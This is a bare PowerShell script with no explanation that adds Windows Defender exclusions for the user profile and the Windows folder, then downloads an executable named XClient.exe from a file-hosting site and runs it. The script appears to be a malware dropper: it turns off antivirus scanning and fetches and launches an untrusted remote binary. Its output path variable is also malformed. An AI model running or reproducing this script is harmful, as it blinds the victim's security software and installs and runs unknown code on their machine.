Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows

$url = "https://www.upload.ee/download/17523163/d6565117de101fe7edd8/XClient.exe"
$output = "$env:XClient.exe"
Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output